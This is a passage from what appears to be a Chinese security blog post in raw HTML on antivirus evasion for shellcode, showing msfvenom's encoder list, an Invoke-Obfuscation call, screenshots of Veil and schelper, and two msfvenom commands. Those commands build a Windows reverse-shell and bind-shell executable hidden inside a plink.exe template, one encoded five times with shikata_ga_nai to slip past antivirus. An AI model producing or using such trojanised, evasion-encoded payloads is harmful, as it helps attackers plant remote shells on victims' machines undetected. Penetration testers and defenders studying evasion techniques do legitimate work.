8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">那么这是利用语言对shellcode编码，也可以选择生成的时候对shellcode编码。</p><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">举例msfvenom:</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">kali@kali:~$ msfvenom -l encoder</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">Framework</span> <span style="color: rgb(0, 134, 179);">Encoders</span> [--encoder <span style="color: rgb(24, 54, 145);">&lt;value&gt;</span>]</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">======================================</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(0, 134, 179);">Name</span>                          <span style="color: rgb(0, 134, 179);">Rank</span>       <span style="color: rgb(0, 134, 179);">Description</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    ----                          ----       -----------</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    cmd/brace                     low        <span style="color: rgb(0, 134, 179);">Bash</span> <span style="color: rgb(0, 134, 179);">Brace</span> <span style="color: rgb(0, 134, 179);">Expansion</span> <span style="color: rgb(0, 134, 179);">Command</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    cmd/echo                      good       <span style="color: rgb(0, 134, 179);">Echo</span> <span style="color: rgb(0, 134, 179);">Command</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    cmd/generic_sh                manual     <span style="color: rgb(0, 134, 179);">Generic</span> <span style="color: rgb(0, 134, 179);">Shell</span> <span style="color: rgb(0, 134, 179);">Variable</span> <span style="color: rgb(0, 134, 179);">Substitution</span> <span style="color: rgb(0, 134, 179);">Command</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    cmd/ifs                       low        <span style="color: rgb(0, 134, 179);">Bourne</span> ${IFS} <span style="color: rgb(0, 134, 179);">Substitution</span> <span style="color: rgb(0, 134, 179);">Command</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    cmd/perl                      normal     <span style="color: rgb(0, 134, 179);">Perl</span> <span style="color: rgb(0, 134, 179);">Command</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    cmd/powershell_base64         excellent  <span style="color: rgb(0, 134, 179);">Powershell</span> <span style="color: rgb(0, 134, 179);">Base64</span> <span style="color: rgb(0, 134, 179);">Command</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    cmd/printf_php_mq             manual     printf(<span style="color: rgb(0, 134, 179);">1</span>) via PHP magic_quotes <span style="color: rgb(0, 134, 179);">Utility</span> <span style="color: rgb(0, 134, 179);">Command</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">generic</span>/eicar                 manual     <span style="color: rgb(0, 134, 179);">The</span> EICAR <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">generic</span>/none                  normal     <span style="color: rgb(0, 134, 179);">The</span> <span style="color: rgb(24, 54, 145);">"none"</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    mipsbe/byte_xori              normal     <span style="color: rgb(0, 134, 179);">Byte</span> <span style="color: rgb(0, 134, 179);">XORi</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    mipsbe/longxor                normal     XOR <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    mipsle/byte_xori              normal     <span style="color: rgb(0, 134, 179);">Byte</span> <span style="color: rgb(0, 134, 179);">XORi</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    mipsle/longxor                normal     XOR <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    php/base64                    great      PHP <span style="color: rgb(0, 134, 179);">Base64</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    ppc/longxor                   normal     PPC <span style="color: rgb(0, 134, 179);">LongXOR</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    ppc/longxor_tag               normal     PPC <span style="color: rgb(0, 134, 179);">LongXOR</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    ruby/base64                   great      <span style="color: rgb(0, 134, 179);">Ruby</span> <span style="color: rgb(0, 134, 179);">Base64</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    sparc/longxor_tag             normal     SPARC DWORD XOR <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x64/xor                       normal     XOR <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x64/xor_context               normal     <span style="color: rgb(0, 134, 179);">Hostname</span>-based <span style="color: rgb(0, 134, 179);">Context</span> <span style="color: rgb(0, 134, 179);">Keyed</span> <span style="color: rgb(0, 134, 179);">Payload</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x64/xor_dynamic               normal     <span style="color: rgb(0, 134, 179);">Dynamic</span> key XOR <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x64/zutto_dekiru              manual     <span style="color: rgb(0, 134, 179);">Zutto</span> <span style="color: rgb(0, 134, 179);">Dekiru</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/add_sub                   manual     <span style="color: rgb(0, 134, 179);">Add</span>/<span style="color: rgb(0, 134, 179);">Sub</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/alpha_mixed               low        <span style="color: rgb(0, 134, 179);">Alpha2</span> <span style="color: rgb(0, 134, 179);">Alphanumeric</span> <span style="color: rgb(0, 134, 179);">Mixedcase</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/alpha_upper               low        <span style="color: rgb(0, 134, 179);">Alpha2</span> <span style="color: rgb(0, 134, 179);">Alphanumeric</span> <span style="color: rgb(0, 134, 179);">Uppercase</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/avoid_underscore_tolower  manual     <span style="color: rgb(0, 134, 179);">Avoid</span> underscore/tolower</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/avoid_utf8_tolower        manual     <span style="color: rgb(0, 134, 179);">Avoid</span> UTF8/tolower</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/bloxor                    manual     <span style="color: rgb(0, 134, 179);">BloXor</span> - A <span style="color: rgb(0, 134, 179);">Metamorphic</span> <span style="color: rgb(0, 134, 179);">Block</span> <span style="color: rgb(0, 134, 179);">Based</span> XOR <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/bmp_polyglot              manual     BMP <span style="color: rgb(0, 134, 179);">Polyglot</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/call4_dword_xor           normal     <span style="color: rgb(0, 134, 179);">Call</span>+<span style="color: rgb(0, 134, 179);">4</span> <span style="color: rgb(0, 134, 179);">Dword</span> XOR <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/context_cpuid             manual     CPUID-based <span style="color: rgb(0, 134, 179);">Context</span> <span style="color: rgb(0, 134, 179);">Keyed</span> <span style="color: rgb(0, 134, 179);">Payload</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/context_stat              manual     stat(<span style="color: rgb(0, 134, 179);">2</span>)-based <span style="color: rgb(0, 134, 179);">Context</span> <span style="color: rgb(0, 134, 179);">Keyed</span> <span style="color: rgb(0, 134, 179);">Payload</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/context_time              manual     time(<span style="color: rgb(0, 134, 179);">2</span>)-based <span style="color: rgb(0, 134, 179);">Context</span> <span style="color: rgb(0, 134, 179);">Keyed</span> <span style="color: rgb(0, 134, 179);">Payload</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/countdown                 normal     <span style="color: rgb(0, 134, 179);">Single</span>-<span style="color: rgb(167, 29, 93);">byte</span> XOR <span style="color: rgb(0, 134, 179);">Countdown</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/fnstenv_mov               normal     <span style="color: rgb(0, 134, 179);">Variable</span>-length <span style="color: rgb(0, 134, 179);">Fnstenv</span>/mov <span style="color: rgb(0, 134, 179);">Dword</span> XOR <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/jmp_call_additive         normal     <span style="color: rgb(0, 134, 179);">Jump</span>/<span style="color: rgb(0, 134, 179);">Call</span> XOR <span style="color: rgb(0, 134, 179);">Additive</span> <span style="color: rgb(0, 134, 179);">Feedback</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/nonalpha                  low        <span style="color: rgb(0, 134, 179);">Non</span>-<span style="color: rgb(0, 134, 179);">Alpha</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/nonupper                  low        <span style="color: rgb(0, 134, 179);">Non</span>-<span style="color: rgb(0, 134, 179);">Upper</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/opt_sub                   manual     <span style="color: rgb(0, 134, 179);">Sub</span> <span style="color: rgb(0, 134, 179);">Encoder</span> (optimised)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/service                   manual     <span style="color: rgb(0, 134, 179);">Register</span> <span style="color: rgb(0, 134, 179);">Service</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/shikata_ga_nai            excellent  <span style="color: rgb(0, 134, 179);">Polymorphic</span> XOR <span style="color: rgb(0, 134, 179);">Additive</span> <span style="color: rgb(0, 134, 179);">Feedback</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/single_static_bit         manual     <span style="color: rgb(0, 134, 179);">Single</span> <span style="color: rgb(0, 134, 179);">Static</span> <span style="color: rgb(0, 134, 179);">Bit</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/unicode_mixed             manual     <span style="color: rgb(0, 134, 179);">Alpha2</span> <span style="color: rgb(0, 134, 179);">Alphanumeric</span> <span style="color: rgb(0, 134, 179);">Unicode</span> <span style="color: rgb(0, 134, 179);">Mixedcase</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/unicode_upper             manual     <span style="color: rgb(0, 134, 179);">Alpha2</span> <span style="color: rgb(0, 134, 179);">Alphanumeric</span> <span style="color: rgb(0, 134, 179);">Unicode</span> <span style="color: rgb(0, 134, 179);">Uppercase</span> <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    x86/xor_dynamic               normal     <span style="color: rgb(0, 134, 179);">Dynamic</span> key XOR <span style="color: rgb(0, 134, 179);">Encoder</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">使用模板和编码器 for example:</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/ plink.exe lhost=<span style="color: rgb(0, 134, 179);">1.1</span>.<span style="color: rgb(0, 134, 179);">1.1</span> lport=<span style="color: rgb(0, 134, 179);">4444</span> -a x86 --platform win -f exe -o a.exe </span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/ plink.exe lhost=<span style="color: rgb(0, 134, 179);">1.1</span>.<span style="color: rgb(0, 134, 179);">1.1</span> lport=<span style="color: rgb(0, 134, 179);">4444</span> -e x86/shikata_ga_nai -i <span style="color: rgb(0, 134, 179);">5</span> -a x86 -platform win -f exe &gt; b.exe</span></code></pre></section><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">Veil中的加密:</h4><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="221" data-backw="319" data-ratio="0.6917740336967294" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结二/3_y7bL9uoTticibouX826tA6YcvYCdrQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkIzB4ibImfdDOl0DKz4ff831gKviby7bL9uoTticibouX826tA6YcvYCdrQ/640?wx_fmt=png'" data-type="png" data-w="1009" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">schelper:</h4><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="128" data-backw="319" data-ratio="0.39923954372623577" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结二/4_vNgY9WBhttiaghx5ayFM3av1zZmrzw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAka4rIv4MbiaZoc9qYa7ENAibVP4ibvNgY9WBhttiaghx5ayFM3av1zZmrzw/640?wx_fmt=png'" data-type="png" data-w="789" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">Obfuscation：</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">Invoke</span>-<span style="color: rgb(0, 134, 179);">Obfuscation</span> -<span style="color: rgb(0, 134, 179);">ScriptBlock</span> {echo xss} -<span style="color: rgb(0, 134, 179);">Command</span> <span style="color: rgb(24, 54, 145);">'Encoding\1,Launcher\PS\67'</span> -<span style="color: rgb(0, 134, 179);">Quiet</span></span></code></pre></section><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="124" data-backw="319" data-ratio="0.3898305084745763" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结二/5_23ia1L9vJ7wC2yISibCI9WQBUaYEow.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAk3wFUet2APxZk8a5pP4DPyKdptZ23ia1L9vJ7wC2yISibCI9WQBUaYEow/640?wx_fmt=png'" data-type="png" data-w="885" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">关于shellcode编码后执行就点到这里，其他语言也是大同小异，就不多列举了。</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">上面是一些编码加密shellcode，下面就看看shellcode注入的技巧方式。</p><p style="white-space: normal;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);"><img data-type="png" data-ratio="0.109375" data-w="640" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结二/6_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="visibility: visible 